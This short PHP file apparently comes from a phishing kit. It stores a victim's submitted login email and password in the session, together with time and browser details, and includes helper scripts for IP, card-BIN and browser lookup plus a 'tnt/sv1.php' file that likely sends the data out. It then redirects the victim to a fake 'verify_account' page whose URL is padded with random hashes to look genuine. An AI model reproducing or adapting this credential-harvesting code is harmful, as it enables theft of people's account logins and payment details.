<?php

session_start();
error_reporting(0);
date_default_timezone_set('America/Los_Angeles');
$TIME_DATE = date('h:i A d/m/Y');

include('../../functions/get_ip.php');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');

$_SESSION['loged'] = "loged1";
$_SESSION['_login_email_']    = $_POST['login_email'];
$_SESSION['_login_password_'] = $_POST['login_password'];
$_SESSION['TIME_DATE'] = $TIME_DATE;
$_SESSION['Agent'] = $_SERVER['HTTP_USER_AGENT'];






include('../tnt/sv1.php');

$url = "../settings/?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."";

header("LOCATION: ".$url."");


		//HEADER("Location: ../settings/?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>